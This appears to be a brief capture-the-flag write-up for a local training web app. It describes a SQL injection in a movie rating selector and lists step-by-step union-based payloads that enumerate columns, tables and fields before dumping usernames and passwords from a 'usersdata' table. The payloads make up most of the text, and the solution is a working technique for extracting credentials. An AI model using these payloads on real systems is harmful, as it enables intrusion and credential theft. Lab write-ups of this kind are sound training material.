there is a vulnerability in a star selector

to solve the task one needs to intercept get request like this one:
http://localhost:3000/hits-student/movies/9

payloads: (don't forget to url encode it)
1st: check the number of columns:
"  order by 3" => "  order by 4" => "  order by 5" => number of columns == 4 
2nd: check all existing tables to find an interesting one: 
" union select null, table_name, null, null from information_schema.tables" => iteresting table is "usersdata"
3rd: check what columns are there:
" union select null, column_name, null, null from information_schema.columns where table_name = 'usersdata'" => id, username, password
4th: output it:
" union select null, username, password, null from usersdata"

to get the flag enter displayed username and password in the "Ð²-it" section
